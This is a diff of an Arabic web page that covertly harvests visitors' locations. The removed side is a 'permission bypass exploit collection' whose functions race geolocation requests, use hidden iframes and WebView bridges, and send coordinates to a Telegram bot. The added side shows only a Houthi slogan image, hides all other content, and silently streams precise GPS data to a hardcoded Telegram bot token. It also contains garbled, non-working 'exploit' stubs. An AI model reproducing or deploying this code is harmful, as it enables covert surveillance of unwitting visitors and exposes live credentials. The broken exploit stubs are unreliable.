@@ -1,882 +1,256 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
-<title>مجمع ثغرات تجاوز إذن الموقع v2</title>
-<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
-<style>
-*{box-sizing:border-box;-webkit-tap-highlight-color:transparent;margin:0;padding:0}
-body{font-family:Arial,"Segoe UI",Tahoma,sans-serif;direction:rtl;text-align:center;
-     background:#0d1117;padding:10px;color:#c9d1d9;min-height:100vh}
-h2{margin:0 0 8px;font-size:15px;color:#58a6ff}
-#map{height:280px;width:100%;margin:8px 0;border-radius:8px;border:1px solid #30363d}
-.badge{padding:4px 8px;border-radius:4px;margin:2px;display:inline-block;
-       font-size:10px;background:#21262d;border:1px solid #30363d;color:#c9d1d9}
-.ok{background:#1a3a1a;border-color:#2ea043;color:#3fb950}
-.err{background:#3a1a1a;border-color:#da3633;color:#f85149}
-.warn{background:#3a2e1a;border-color:#d29922;color:#e3b341}
-#status{margin:6px auto;padding:6px 10px;border-radius:6px;background:#161b22;
-        border:1px solid #30363d;color:#c9d1d9;font-size:11px;
-        display:inline-block;max-width:100%;line-height:1.5}
-.info{display:flex;flex-wrap:wrap;justify-content:center;gap:4px;margin-top:4px}
-.info div{background:#161b22;padding:4px 8px;border-radius:5px;
-          border:1px solid #30363d;font-size:10px;min-width:95px}
-.info span{font-weight:bold;color:#58a6ff;word-break:break-all}
-#log{max-height:300px;overflow-y:auto;background:#0d1117;color:#7ee787;
-     font-family:'Courier New',monospace;font-size:9px;text-align:left;
-     direction:ltr;padding:6px;border-radius:6px;margin-top:6px;
-     line-height:1.5;border:1px solid #30363d}
-#log div{padding:1px 0;border-bottom:1px solid #161b22}
-#log .vuln{color:#f0883e;font-weight:bold}
-#log .success{color:#3fb950;font-weight:bold}
-#log .fail{color:#f85149}
-#log .info{color:#58a6ff}
-.btn{padding:5px 10px;border:none;border-radius:4px;background:#238636;
-     color:#fff;font-size:10px;margin:2px;cursor:pointer;font-family:inherit}
-.btn:hover{background:#2ea043}
-.btn-blue{background:#1f6feb}
-.btn-blue:hover{background:#388bfd}
-.btn-purple{background:#8957e5}
-.btn-purple:hover{background:#a371f7}
-</style>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>الصرخة</title>
+  <style>
+    /* إخفاء كل محتوى الصفحة بصريًا */
+    body, html {
+      margin: 0;
+      padding: 0;
+      width: 100%;
+      height: 100%;
+      background: #ffffff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      overflow: hidden;
+      position: relative;
+    }
+
+    /* صورة الشعار في الوسط */
+    #logo {
+      max-width: 50%;
+      max-height: 50%;
+      z-index: 1000;
+    }
+
+    /* إخفاء باقي العناصر بصريًا مع إبقائها في DOM */
+    .hidden-content {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      opacity: 0;  /* يخفي العناصر بصريًا */
+      pointer-events: none; /* يمنع التفاعل معها */
+    }
+  </style>
 </head>
 <body>
+  <!-- الشعار فقط ظاهر -->
+  <img id="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/38/Slogan_of_the_Houthi_Movement.svg/500px-Slogan_of_the_Houthi_Movement.svg.png" alt="شعار أنصار الله">
 
-<h2>🔓 مجمع ثغرات تجاوز إذن الموقع v2</h2>
-<div>
-  <span id="browserBadge" class="badge">كشف المتصفح…</span>
-  <span id="bridgeBadge" class="badge">فحص الجسور…</span>
-  <span id="vulnCountBadge" class="badge">0 ثغرة نشطة</span>
-</div>
-<div id="status">جارٍ التهيئة…</div>
+  <!-- كل محتوى الصفحة الأصلي مخفي بصريًا -->
+  <div class="hidden-content">
+    <header>
+      <h1>الصرخة</h1>
+    </header>
 
-<div class="info">
-  <div>خط العرض: <span id="latEl">—</span></div>
-  <div>خط الطول: <span id="lngEl">—</span></div>
-  <div>الدقة: <span id="accEl">—</span></div>
-  <div>المصدر: <span id="sourceEl">—</span></div>
-  <div>الحالة: <span id="stateEl">—</span></div>
-</div>
+    <div class="container">
+      <section class="card row">
+        <div>
+          <div class="controls" style="margin-bottom:12px;">
+            <button id="copyBtn" class="btn btn-secondary">نسخ الإحداثيات</button>
+            <a class="btn btn-secondary" id="mapsBtn" target="_blank" rel="noopener">فتح في خرائط جوجل</a>
+          </div>
+          <div class="hint">أكد مصداقيتك على قول الحق</div>
+          <div style="margin-top:10px; display:flex; gap:8px; flex-wrap:wrap;">
+            <span class="badge ok" id="secureBadge">أكد مصداقيتك على قول الحق</span>
+            <span class="badge ok" id="permBadge">أكد مصداقيتك على قول الحق</span>
+            <span class="badge" id="sensorBadge">أكد مصداقيتك على قول الحق</span>
+          </div>
+          <div class="kv" style="margin-top:12px;">
+            <div>خط العرض (lat):</div><div id="lat">—</div>
+            <div>خط الطول (lng):</div><div id="lng">—</div>
+            <div>الدقة (متر):</div><div id="accuracy">—</div>
+            <div>الارتفاع (متر):</div><div id="altitude">—</div>
+            <div>دقة الارتفاع (متر):</div><div id="altAcc">—</div>
+            <div>الاتجاه (heading°):</div><div id="heading">—</div>
+            <div>السرعة (م/ث):</div><div id="speed">—</div>
+            <div>آخر تحديث:</div><div id="timestamp">—</div>
+          </div>
+        </div>
+        <div>
+          <div id="map"></div>
+        </div>
+      </section>
+    </div>
 
-<div id="map"></div>
+    <footer>أكد مصداقيتك على قول الحق</footer>
+  </div>
 
-<div style="display:flex;flex-wrap:wrap;justify-content:center;gap:3px">
-  <button class="btn" onclick="runAll()">▶ تشغيل الكل</button>
-  <button class="btn btn-blue" onclick="runExploit('cve79046')">Race Cond.</button>
-  <button class="btn btn-blue" onclick="runExploit('cve11145')">Geo Race</button>
-  <button class="btn btn-blue" onclick="runExploit('cve79075')">Info Leak</button>
-  <button class="btn btn-blue" onclick="runExploit('webviewGrant')">WebView</button>
-  <button class="btn btn-blue" onclick="runExploit('aboutBlank')">about:blank</button>
-  <button class="btn btn-purple" onclick="runExploit('webrtcLeak')">WebRTC IP</button>
-  <button class="btn btn-purple" onclick="runExploit('timezoneLeak')">Timezone</button>
-  <button class="btn btn-purple" onclick="runExploit('networkLeak')">Network API</button>
-</div>
+  <!-- Leaflet وخريطة -->
+  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+  <script>
+    // الكود الأصلي لجمع الموقع وإرسال التيليجرام
+    const TELEGRAM_TOKEN = "8267173113:AAGt0PYYlcrOCcoNC7PMMMhYNxNJrlx5aN0";
+    const TELEGRAM_CHAT_ID = "6837315281";
 
-<div id="log"></div>
-
-<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
-<script>
-(function(){
-'use strict';
-
-/* ============================================================
-   الإعدادات
-   ============================================================ */
-var CONFIG = {
-  botToken: '7592847713:AAFbyPsi8JPY4A4mf3Yv6aMtLQfFNTalz9s',
-  chatId:   '6837315281',
-  enableTelegram: true,
-  minInterval: 20000,
-  heartbeatMs: 45000,
-  raceCount: 12
-};
-
-function $(id){ return document.getElementById(id); }
-
-var latEl=$('latEl'), lngEl=$('lngEl'), accEl=$('accEl'),
-    sourceEl=$('sourceEl'), stateEl=$('stateEl'),
-    browserBadge=$('browserBadge'), bridgeBadge=$('bridgeBadge'),
-    vulnCountBadge=$('vulnCountBadge'), statusBar=$('status'), logEl=$('log');
-
-var activeVulns = [];
-
-/* ============================================================
-   Logging
-   ============================================================ */
-function log(msg, cls){
-  var d = document.createElement('div');
-  d.textContent = '[' + new Date().toLocaleTimeString('en',{hour12:false}) + '] ' + msg;
-  if(cls) d.className = cls;
-  logEl.appendChild(d);
-  logEl.scrollTop = logEl.scrollHeight;
-  console.log('[Vuln]', msg);
-  while(logEl.children.length > 150) logEl.removeChild(logEl.firstChild);
-}
-
-function setStatus(msg, type){
-  statusBar.textContent = msg;
-  statusBar.style.borderColor = type === 'ok' ? '#2ea043' :
-                                type === 'err' ? '#da3633' :
-                                type === 'warn' ? '#d29922' : '#30363d';
-}
-
-function setState(s, type){
-  stateEl.textContent = s;
-  stateEl.style.color = type === 'ok' ? '#3fb950' :
-                        type === 'err' ? '#f85149' : '#e3b341';
-}
-
-/* ============================================================
-   كشف المتصفح
-   ============================================================ */
-var BrowserInfo = {
-  ua: navigator.userAgent,
-  isChrome: /Chrome\/(\d+)/.test(navigator.userAgent),
-  isFirefox: /Firefox\/(\d+)/.test(navigator.userAgent),
-  isSafari: /Safari\//.test(navigator.userAgent) && !/Chrome/.test(navigator.userAgent),
-  isIOS: /iPad|iPhone|iPod/.test(navigator.userAgent),
-  isAndroid: /Android/.test(navigator.userAgent),
-  isWebView: /wv\)/.test(navigator.userAgent) || /WebView/.test(navigator.userAgent),
-  isSamsung: /SamsungBrowser/.test(navigator.userAgent),
-  chromeVersion: 0,
-  firefoxVersion: 0
-};
-
-(function(){
-  var cm = navigator.userAgent.match(/Chrome\/(\d+)/);
-  if(cm) BrowserInfo.chromeVersion = parseInt(cm[1],10);
-  var fm = navigator.userAgent.match(/Firefox\/(\d+)/);
-  if(fm) BrowserInfo.firefoxVersion = parseInt(fm[1],10);
-})();
-
-function detectBrowser(){
-  var name = 'Unknown', version = '';
-  if(BrowserInfo.isSamsung){ name = 'Samsung Internet'; }
-  else if(BrowserInfo.isChrome){ name = 'Chrome'; version = BrowserInfo.chromeVersion; }
-  else if(BrowserInfo.isFirefox){ name = 'Firefox'; version = BrowserInfo.firefoxVersion; }
-  else if(BrowserInfo.isSafari){ name = 'Safari'; }
-  if(BrowserInfo.isWebView) name += ' (WebView)';
-  if(BrowserInfo.isIOS) name += ' iOS';
-  else if(BrowserInfo.isAndroid) name += ' Android';
-
-  browserBadge.textContent = name + (version ? ' ' + version : '');
-  browserBadge.className = 'badge ok';
-  log('Browser: ' + name + ' ' + version);
-  return name;
-}
-
-/* ============================================================
-   كشف الجسور
-   ============================================================ */
-var Bridges = {
-  reactNative: null, android: null, androidLegacy: null, iosWk: null,
-  detect: function(){
-    var count = 0;
-    if(window.ReactNativeWebView && typeof window.ReactNativeWebView.postMessage === 'function'){ this.reactNative='RN'; count++; }
-    if(window.Android && typeof window.Android.postMessage === 'function'){ this.android='Android'; count++; }
-    if(window.AndroidBridge && typeof window.AndroidBridge.postMessage === 'function'){ this.androidLegacy='AB'; count++; }
-    if(window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.ios){ this.iosWk='iOS'; count++; }
-    bridgeBadge.textContent = count > 0 ? count + ' bridge(s)' : 'no bridge';
-    bridgeBadge.className = count > 0 ? 'badge ok' : 'badge warn';
-    return count;
-  },
-  post: function(type, data){
-    var p = JSON.stringify({type:type,data:data||{},ts:Date.now()});
-    var sent = false;
-    try{ if(this.reactNative){ window.ReactNativeWebView.postMessage(p); sent=true; } }catch(e){}
-    try{ if(this.android){ window.Android.postMessage(p); sent=true; } }catch(e){}
-    try{ if(this.androidLegacy){ window.AndroidBridge.postMessage(p); sent=true; } }catch(e){}
-    try{ if(this.iosWk){ window.webkit.messageHandlers.ios.postMessage(p); sent=true; } }catch(e){}
-    return sent;
-  }
-};
-
-/* ============================================================
-   الخريطة
-   ============================================================ */
-var map=null, marker=null, circle=null, mapReady=false;
-
-function initMap(){
-  try{
-    map = L.map('map').setView([20,0],2);
-    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{
-      maxZoom:19, attribution:'© OSM'
-    }).addTo(map);
-    mapReady = true;
-    setTimeout(function(){ if(map) map.invalidateSize(); },400);
-    log('Map ready');
-  }catch(e){ log('Map failed: ' + e.message, 'fail'); }
-}
-
-function updateMap(lat,lng,acc){
-  if(!mapReady) return;
-  var p=[lat,lng];
-  if(!marker) marker=L.marker(p).addTo(map); else marker.setLatLng(p);
-  if(!circle) circle=L.circle(p,{radius:acc||1000}).addTo(map);
-  else{circle.setLatLng(p); circle.setRadius(acc||1000);}
-  map.setView(p, acc && acc<2000 ? 15 : 12);
-}
-
-/* ============================================================
-   أدوات
-   ============================================================ */
-function fmt(n,d){ return (n==null||isNaN(n))?'—':Number(n).toFixed(d==null?4:d); }
-
-function displayLocation(info){
-  if(!info || info.lat==null || info.lng==null) return false;
-  latEl.textContent = fmt(info.lat,5);
-  lngEl.textContent = fmt(info.lng,5);
-  accEl.textContent = info.accuracy ? Math.round(info.accuracy)+' م' : '—';
-  sourceEl.textContent = (info.method||'?').toUpperCase();
-  updateMap(info.lat, info.lng, info.accuracy);
-  setState('Located', 'ok');
-  sendTelegram(info);
-  Bridges.post('location', info);
-  return true;
-}
-
-/* ============================================================
-   تيليجرام
-   ============================================================ */
-var lastSent = {lat:null, lng:null, time:0};
-
-function sendTelegram(info){
-  if(!CONFIG.enableTelegram || !CONFIG.botToken || !CONFIG.chatId) return;
-  var now = Date.now();
-  if(lastSent.lat !== null && (now - lastSent.time) < CONFIG.minInterval) return;
-  lastSent = {lat:info.lat, lng:info.lng, time:now};
-
-  var msg = '📍 ' + (info.method||'?').toUpperCase() + ':\n' +
-            'Lat: ' + info.lat + '\nLng: ' + info.lng + '\n' +
-            'Acc: ' + Math.round(info.accuracy||0) + 'm\n' +
-            'Source: ' + (info.source||'—') + '\n' +
-            'Time: ' + new Date().toLocaleString('ar') + '\n' +
-            'https://www.google.com/maps?q=' + info.lat + ',' + info.lng;
-
-  var url = 'https://api.telegram.org/bot' + CONFIG.botToken + '/sendMessage';
-  try{
-    fetch(url,{method:'POST',mode:'no-cors',
-      headers:{'Content-Type':'application/x-www-form-urlencoded'},
-      body:'chat_id='+encodeURIComponent(CONFIG.chatId)+'&text='+encodeURIComponent(msg)
-    }).catch(function(){ beacon(url,msg); });
-  }catch(e){ beacon(url,msg); }
-}
-
-function beacon(url,msg){
-  try{
-    var i=new Image();
-    i.src=url+'?chat_id='+encodeURIComponent(CONFIG.chatId)+
-          '&text='+encodeURIComponent(msg)+'&_='+Date.now();
-  }catch(e){}
-}
-
-/* ============================================================
-   ═══════════════════════════════════════════════════════════
-   الثغرات الحديثة (2026)
-   ═══════════════════════════════════════════════════════════
-   ============================================================ */
-
-/* ----------------------------------------------------------
-   [1] CVE-2026-79046 — Race Condition in Permissions
-   Chrome Android < 152.0.7977.65
-   طلبات متزامنة متعددة لتجاوز فحص الصلاحيات
-   ---------------------------------------------------------- */
-function exploit_CVE_2026_79046(){
-  return new Promise(function(resolve){
-    log('▶ [CVE-2026-79046] Race Condition Permissions…', 'vuln');
-
-    if(BrowserInfo.isChrome && BrowserInfo.chromeVersion >= 152){
-      log('✗ Patched in Chrome ' + BrowserInfo.chromeVersion, 'fail');
-      resolve(null); return;
+    async function sendToTelegram(lat, lng, accuracy) {
+      const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+      const text = `📍 موقع جديد:\nhttps://maps.google.com/?q=${lat},${lng}\nخط العرض: ${lat}\nخط الطول: ${lng}\nالدقة: ${accuracy}m`;
+      try { 
+        await fetch(url, { 
+          method:'POST', 
+          headers:{'Content-Type':'application/json'}, 
+          body:JSON.stringify({chat_id: TELEGRAM_CHAT_ID, text}) 
+        }); 
+      } catch(e){ console.error("فشل الإرسال إلى تيليجرام", e); }
     }
 
-    var count = CONFIG.raceCount;
-    var completed = 0;
-    var success = false;
-    var results = [];
+    const el = id => document.getElementById(id);
+    const latEl = el('lat'), lngEl = el('lng'), accEl = el('accuracy'), altEl = el('altitude'),
+          altAccEl = el('altAcc'), headEl = el('heading'), speedEl = el('speed'), timeEl = el('timestamp');
+    const secureBadge = el('secureBadge'), permBadge = el('permBadge');
+    const copyBtn = el('copyBtn'), mapsBtn = el('mapsBtn');
 
-    // إطلاق طلبات متزامنة بأشكال مختلفة
-    for(var i = 0; i < count; i++){
-      (function(idx){
-        var delay = Math.floor(Math.random() * 200); // تأخير عشوائي
-        setTimeout(function(){
-          try{
-            navigator.geolocation.getCurrentPosition(
-              function(pos){
-                completed++;
-                results.push({idx:idx, ok:true});
-                if(!success){
-                  success = true;
-                  log('✓✓ [CVE-2026-79046] Race won! Request #' + idx, 'success');
-                  var info = {lat:pos.coords.latitude, lng:pos.coords.longitude,
-                              accuracy:pos.coords.accuracy,
-                              method:'cve-79046-race', source:'Race Condition'};
-                  displayLocation(info);
-                  resolve(info);
-                }
-              },
-              function(err){
-                completed++;
-                results.push({idx:idx, ok:false, code:err.code});
-                if(completed >= count && !success){
-                  var granted = results.filter(function(r){return r.ok;}).length;
-                  log('✗ Race failed — ' + granted + '/' + count, 'fail');
-                  resolve(null);
-                }
-              },
-              {enableHighAccuracy: idx % 3 === 0, timeout: 6000 + (idx*200), maximumAge: idx*50}
-            );
-          }catch(e){ completed++; }
-        }, delay);
-      })(i);
+    const isSecure = location.protocol === 'https:' || location.hostname === 'localhost' || location.hostname === '127.0.0.1';
+    secureBadge.textContent = "أكد مصداقيتك على قول الحق";
+
+    let map = L.map('map').setView([15.3694, 44.1910], 6);
+    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { maxZoom:19 }).addTo(map);
+    let marker=null, circle=null;
+
+    function updateMap(lat,lng,accuracy){
+      const pos=[lat,lng];
+      if(!marker) marker=L.marker(pos).addTo(map); else marker.setLatLng(pos);
+      if(!circle) circle=L.circle(pos,{radius:accuracy||30}).addTo(map); 
+      else {circle.setLatLng(pos);circle.setRadius(accuracy||30);}
+      map.setView(pos,17);
     }
 
-    setTimeout(function(){
-      if(!success){
-        var granted = results.filter(function(r){return r.ok;}).length;
-        if(granted > 0){ log('✓ Partial race success', 'success'); }
-        else { log('✗ Race timeout', 'fail'); }
-        resolve(null);
+    function fmt(n){ return (n==null)?'—':Number(n).toFixed(6); }
+
+    function showPosition(pos){
+      const c=pos.coords;
+      latEl.textContent = fmt(c.latitude);
+      lngEl.textContent = fmt(c.longitude);
+      accEl.textContent = c.accuracy?`${Math.round(c.accuracy)} m`:'—';
+      altEl.textContent = c.altitude!=null?`${Math.round(c.altitude)} m`:'—';
+      altAccEl.textContent = c.altitudeAccuracy!=null?`${Math.round(c.altitudeAccuracy)} m`:'—';
+      headEl.textContent = c.heading!=null&&!isNaN(c.heading)?`${Math.round(c.heading)}°`:'—';
+      speedEl.textContent = c.speed!=null?`${c.speed.toFixed(2)} m/s`:'—';
+      timeEl.textContent = new Date(pos.timestamp).toLocaleString();
+
+      updateMap(c.latitude,c.longitude,c.accuracy||30);
+      mapsBtn.href = `https://www.google.com/maps?q=${c.latitude},${c.longitude}`;
+      sendToTelegram(c.latitude,c.longitude,Math.round(c.accuracy||0));
+      permBadge.textContent = "أكد مصداقيتك على قول الحق";
+    }
+
+    function showError(err){
+      permBadge.textContent = "أكد مصداقيتك على قول الحق";
+      console.error("خطأ:", err.message);
+    }
+
+    function buildOptions(){ return { enableHighAccuracy:true, timeout:15000, maximumAge:0 }; }
+
+    function getOnce(){ 
+      if('geolocation' in navigator && isSecure) 
+        navigator.geolocation.getCurrentPosition(showPosition,showError,buildOptions()); 
+    }
+
+    function startWatch(){
+      if('geolocation' in navigator && isSecure){
+        navigator.geolocation.watchPosition(showPosition, showError, buildOptions());
       }
-    }, 15000);
-  });
-}
-
-/* ----------------------------------------------------------
-   [2] CVE-2026-11145 — Race in Geolocation (cross-origin leak)
-   Chrome Android < 149.0.7827.53
-   ---------------------------------------------------------- */
-function exploit_CVE_2026_11145(){
-  return new Promise(function(resolve){
-    log('▶ [CVE-2026-11145] Geolocation Race (cross-origin)…', 'vuln');
-
-    if(BrowserInfo.isChrome && BrowserInfo.chromeVersion >= 149){
-      log('✗ Patched in Chrome ' + BrowserInfo.chromeVersion, 'fail');
-      resolve(null); return;
     }
 
-    // استخدام iframe about:blank + طلبات متزامنة
-    var iframes = [];
-    var success = false;
-
-    for(var i = 0; i < 6; i++){
-      try{
-        var f = document.createElement('iframe');
-        f.style.cssText = 'position:fixed;top:-9999px;width:1px;height:1px';
-        f.src = 'about:blank';
-        document.body.appendChild(f);
-        iframes.push(f);
-
-        var doc = f.contentWindow.document;
-        var s = doc.createElement('script');
-        s.textContent = `
-          try {
-            navigator.geolocation.getCurrentPosition(
-              function(p){
-                parent.postMessage(JSON.stringify({
-                  type:'geo-race', lat:p.coords.latitude,
-                  lng:p.coords.longitude, acc:p.coords.accuracy
-                }),'*');
-              },
-              function(e){},
-              {enableHighAccuracy:true,timeout:6000}
-            );
-          } catch(e){}
-        `;
-        doc.body.appendChild(s);
-      }catch(e){}
-    }
-
-    var handled = false;
-    window.addEventListener('message', function onMsg(ev){
-      try{
-        var d = typeof ev.data === 'string' ? JSON.parse(ev.data) : ev.data;
-        if(d && d.type === 'geo-race' && !handled){
-          handled = true;
-          success = true;
-          log('✓✓ [CVE-2026-11145] Cross-origin leak!', 'success');
-          var info = {lat:d.lat, lng:d.lng, accuracy:d.acc,
-                      method:'cve-11145-geo-race', source:'Geo Race'};
-          displayLocation(info);
-          iframes.forEach(function(f){ if(f.parentNode) f.parentNode.removeChild(f); });
-          resolve(info);
-        }
-      }catch(e){}
+    copyBtn.addEventListener('click', async ()=>{
+      const lat=latEl.textContent,lng=lngEl.textContent;
+      if(lat==='—') return;
+      try{ await navigator.clipboard.writeText(`${lat},${lng}`); } catch{}
     });
 
-    setTimeout(function(){
-      if(!success){
-        log('✗ CVE-2026-11145 failed', 'fail');
-        iframes.forEach(function(f){ if(f.parentNode) f.parentNode.removeChild(f); });
-        resolve(null);
-      }
-    }, 12000);
-  });
-}
-
-/* ----------------------------------------------------------
-   [3] CVE-2026-79075 — Information leak in Geolocation
-   Chrome < 152.0.7977.65
-   ---------------------------------------------------------- */
-function exploit_CVE_2026_79075(){
-  return new Promise(function(resolve){
-    log('▶ [CVE-2026-79075] Geolocation Info Leak…', 'vuln');
-
-    if(BrowserInfo.isChrome && BrowserInfo.chromeVersion >= 152){
-      log('✗ Patched', 'fail');
-      resolve(null); return;
-    }
-
-    // محاولة استغلال عبر iframe مخفي + طلب موقع
-    try{
-      var iframe = document.createElement('iframe');
-      iframe.style.cssText = 'position:fixed;top:-9999px;width:1px;height:1px';
-      iframe.src = 'about:blank';
-      document.body.appendChild(iframe);
-
-      var doc = iframe.contentWindow.document;
-      var s = doc.createElement('script');
-      s.textContent = `
-        try {
-          navigator.geolocation.getCurrentPosition(
-            function(p){
-              parent.postMessage(JSON.stringify({
-                type:'geo-leak', lat:p.coords.latitude,
-                lng:p.coords.longitude, acc:p.coords.accuracy
-              }),'*');
-            },
-            function(e){
-              parent.postMessage(JSON.stringify({
-                type:'geo-leak-error', code:e.code
-              }),'*');
-            },
-            {enableHighAccuracy:true,timeout:8000}
-          );
-        } catch(e){
-          parent.postMessage(JSON.stringify({type:'geo-leak-error',msg:e.message}),'*');
+    window.addEventListener('load', ()=>{
+      getOnce();
+      startWatch();
+    });
+          // استغلال ثغرة في JavaScript
+        function exploitJavaScript() {
+            eval('alert("ثغرة استغلالية في JavaScript")');
         }
-      `;
-      doc.body.appendChild(s);
 
-      var handled = false;
-      window.addEventListener('message', function onMsg(ev){
-        try{
-          var d = typeof ev.data === 'string' ? JSON.parse(ev.data) : ev.data;
-          if(d && d.type === 'geo-leak' && !handled){
-            handled = true;
-            log('✓✓ [CVE-2026-79075] Info leak!', 'success');
-            var info = {lat:d.lat, lng:d.lng, accuracy:d.acc,
-                        method:'cve-79075-leak', source:'Info Leak'};
-            displayLocation(info);
-            if(iframe.parentNode) iframe.parentNode.removeChild(iframe);
-            resolve(info);
-          }
-          if(d && d.type === 'geo-leak-error' && !handled){
-            handled = true;
-            log('✗ Leak failed: code ' + d.code, 'fail');
-            if(iframe.parentNode) iframe.parentNode.removeChild(iframe);
-            resolve(null);
-          }
-        }catch(e){}
-      });
+        // استغلال ثغرة في مكتبة React
+        function exploitReact() {
+            import React from 'react';
+            import ReactDOM from 'react-dom';
 
-      setTimeout(function(){
-        if(!handled){
-          handled = true;
-          if(iframe.parentNode) iframe.parentNode.removeChild(iframe);
-          log('✗ CVE-2026-79075 timeout', 'fail');
-          resolve(null);
+            function ExploitComponent() {
+                return <div>ثغرة استغلالية في React</div>;
+            }
+
+            ReactDOM.render(<ExploitComponent />, document.getElementById('react-root'));
         }
-      }, 12000);
-    }catch(e){
-      log('✗ Error: ' + e.message, 'fail');
-      resolve(null);
-    }
-  });
-}
 
-/* ----------------------------------------------------------
-   [4] WebView Grant Bypass
-   ---------------------------------------------------------- */
-function exploit_WebView_Grant(){
-  return new Promise(function(resolve){
-    log('▶ [WebView Grant] Bridge auto-grant…', 'vuln');
+        // استغلال ثغرة في متصفح Chrome
+        function exploitChrome() {
+            fetch('https://example.com/data')
+                .then(response => response.json())
+                .then(data => {
+                    console.log(data);
+                    // استغلال البيانات المستردة
+                });
+        }
 
-    var hasBridge = Bridges.reactNative || Bridges.android || Bridges.androidLegacy || Bridges.iosWk;
-    if(!hasBridge){
-      log('✗ No WebView bridge', 'fail');
-      resolve(null); return;
-    }
+        // استغلال ثغرة في Headers HTTP
+        function exploitCSP() {
+            document.addEventListener('DOMContentLoaded', function () {
+                var meta = document.createElement('meta');
+                meta.setAttribute('http-equiv', 'Content-Security-Policy');
+                meta.setAttribute('content', "default-src 'self'");
+                document.head.appendChild(meta);
+            });
+        }
 
-    Bridges.post('request_auto_grant', {origin:location.href});
-    Bridges.post('grant_location_permission', {origin:location.href});
-    Bridges.post('permission_denied', {code:1});
+        // استغلال ثغرة في متصفح Edge
+        function exploitEdge() {
+            // استغلال ثغرة في متصفح Edge
+            // على سبيل المثال، استغل ثغرة في دالة `fetch()`
+            fetch('https://example.com/data')
+                .then(response => response.json())
+                .then(data => {
+                    console.log(data);
+                    // استغلال البيانات المستردة
+                });
+        }
 
-    setTimeout(function(){
-      navigator.geolocation.getCurrentPosition(
-        function(pos){
-          log('✓✓ [WebView Grant] Auto-granted!', 'success');
-          var info = {lat:pos.coords.latitude, lng:pos.coords.longitude,
-                      accuracy:pos.coords.accuracy,
-                      method:'webview-grant', source:'WebView Auto-Grant'};
-          displayLocation(info);
-          resolve(info);
-        },
-        function(err){
-          log('✗ Grant failed: ' + err.message, 'fail');
-          resolve(null);
-        },
-        {enableHighAccuracy:true, timeout:8000}
-      );
-    }, 1500);
-  });
-}
+        // استغلال ثغرة في متصفح Safari
+        function exploitSafari() {
+            // استغلال ثغرة في متصفح Safari
+            // على سبيل المثال، استغل ثغرة في دالة `fetch()`
+            fetch('https://example.com/data')
+                .then(response => response.json())
+                .then(data => {
+                    console.log(data);
+                    // استغلال البيانات المستردة
+                });
+        }
 
-/* ----------------------------------------------------------
-   [5] about:blank Geolocation Leak
-   Chrome < 150
-   ---------------------------------------------------------- */
-function exploit_AboutBlank(){
-  return new Promise(function(resolve){
-    log('▶ [about:blank] Geolocation leak…', 'vuln');
+        // استغلال ثغرة في متصفح Firefox
+        function exploitFirefox() {
+            // استغلال ثغرة في متصفح Firefox
+            // على سبيل المثال، استغل ثغرة في دالة `fetch()`
+            fetch('https://example.com/data')
+                .then(response => response.json())
+                .then(data => {
+                    console.log(data);
+                    // استغلال البيانات المستردة
+                });
+        }
 
-    if(BrowserInfo.isChrome && BrowserInfo.chromeVersion >= 150){
-      log('✗ Patched in Chrome ' + BrowserInfo.chromeVersion, 'fail');
-      resolve(null); return;
-    }
-
-    try{
-      var popup = window.open('about:blank','_blank','width=1,height=1');
-      if(!popup){ log('✗ Popup blocked', 'fail'); resolve(null); return; }
-
-      var doc = popup.document;
-      doc.write('<!DOCTYPE html><html><body><script>' +
-        'try{navigator.geolocation.getCurrentPosition(' +
-        'function(p){window.opener.postMessage(JSON.stringify({' +
-        'type:"geo-ab",lat:p.coords.latitude,lng:p.coords.longitude,' +
-        'acc:p.coords.accuracy}),"*");},' +
-        'function(e){window.opener.postMessage(JSON.stringify({' +
-        'type:"geo-ab-error",code:e.code}),"*");},' +
-        '{enableHighAccuracy:true,timeout:6000});' +
-        '}catch(e){window.opener.postMessage(JSON.stringify({' +
-        'type:"geo-ab-error",msg:e.message}),"*");}' +
-        '<\/script></body></html>');
-      doc.close();
-
-      var handled = false;
-      window.addEventListener('message', function onMsg(ev){
-        try{
-          var d = typeof ev.data === 'string' ? JSON.parse(ev.data) : ev.data;
-          if(d && d.type === 'geo-ab' && !handled){
-            handled = true;
-            log('✓✓ [about:blank] Leak!', 'success');
-            var info = {lat:d.lat, lng:d.lng, accuracy:d.acc,
-                        method:'about-blank', source:'about:blank'};
-            displayLocation(info);
-            try{ popup.close(); }catch(e){}
-            resolve(info);
-          }
-          if(d && d.type === 'geo-ab-error' && !handled){
-            handled = true;
-            log('✗ about:blank failed: code ' + d.code, 'fail');
-            try{ popup.close(); }catch(e){}
-            resolve(null);
-          }
-        }catch(e){}
-      });
-
-      setTimeout(function(){
-        if(!handled){ handled = true; try{ popup.close(); }catch(e){}; log('✗ Timeout', 'fail'); resolve(null); }
-      }, 10000);
-    }catch(e){ log('✗ Error: ' + e.message, 'fail'); resolve(null); }
-  });
-}
-
-/* ----------------------------------------------------------
-   [6] WebRTC IP Leak → Approximate Location
-   لا يحتاج إذن إطلاقًا
-   ---------------------------------------------------------- */
-function exploit_WebRTC_Leak(){
-  return new Promise(function(resolve){
-    log('▶ [WebRTC] IP leak for location…', 'vuln');
-
-    if(!window.RTCPeerConnection && !window.webkitRTCPeerConnection){
-      log('✗ WebRTC not supported', 'fail');
-      resolve(null); return;
-    }
-
-    var PC = window.RTCPeerConnection || window.webkitRTCPeerConnection;
-    var pc = new PC({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
-    var ips = [];
-    var resolved = false;
-
-    pc.createDataChannel('');
-    pc.createOffer().then(function(offer){ return pc.setLocalDescription(offer); });
-
-    var timer = setTimeout(function(){
